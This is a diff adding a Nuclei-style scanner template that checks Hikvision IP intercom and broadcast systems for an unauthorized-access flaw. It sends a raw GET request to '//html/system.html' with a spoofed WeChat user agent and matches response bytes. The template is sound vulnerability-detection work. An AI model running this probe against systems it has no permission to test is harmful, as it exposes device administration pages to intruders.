@@ -1,0 +1,26 @@
+id: sponip-system-weak
+info:
+  name: sponip-system-weak
+  author: apple
+  severity: high
+  description: 杭州海康威视数字科技有限公司的IP网络对讲广播系统存在未经授权的访问漏洞.
+  reference:
+    - https://github.com/willchen0011/cve/blob/main/unaccess.md
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET //html/system.html HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.38(0x1800262b) NetType/WIFI Language/zh_CN qcloudcdn-xinan Request-Source=4 Request-Channel=99
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+    matchers:
+      - type: binary
+        part: body
+        binary:
+          - e7b3bbe7
